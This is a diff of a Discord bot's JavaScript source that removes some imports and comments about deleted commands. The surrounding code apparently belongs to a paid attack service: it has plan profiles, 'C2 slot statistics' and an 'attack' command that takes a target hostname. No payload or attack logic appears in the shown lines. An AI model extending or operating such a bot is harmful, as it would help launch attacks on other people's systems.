@@ -1,10 +1,8 @@
 import 'dotenv/config';
 import { exec } from 'node:child_process';
 import { Client, GatewayIntentBits, ActivityType, Partials, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ContainerBuilder, MessageFlags, SectionBuilder, SeparatorBuilder, TextDisplayBuilder, ThumbnailBuilder, PermissionsBitField } from 'discord.js';
-import * as Vault from './vault-db.js';
-import { buildDiscordRoleNames, userPlanRole } from './discord.js';
 import { formatSlotBar } from './helpers.js';
-import { DISCORD_DEFAULTS, API_CONFIG, APP_DEFAULTS } from './config.js';
+import { DISCORD_DEFAULTS, APP_DEFAULTS } from './config.js';
 
 const token = process.env.DISCORD_TOKEN;
 const clientId = process.env.DISCORD_CLIENT_ID;
@@ -582,8 +580,6 @@ const planCommand = new SlashCommandBuilder()
   .setName('plan')
   .setDescription('Show your CAPI account profile and linked status');
 
-// methods command removed — use in-API catalog or admin tools instead
-
 const graphCommand = new SlashCommandBuilder()
   .setName('graph')
   .setDescription('Show live API and C2 slot statistics')
@@ -850,8 +846,6 @@ client.on('interactionCreate', async (interaction) => {
       }
       return;
     }
-
-    // attack_copy handler removed (ID and copy button no longer present)
 
     if (interaction.customId === 'graph_refresh') {
       const stats = await fetchGraphStats();
@@ -1265,8 +1259,6 @@ client.on('interactionCreate', async (interaction) => {
     }
     return;
   }
-
-  // methods command removed
 
   if (interaction.commandName === 'attack') {
     const host = interaction.options.getString('hostname');
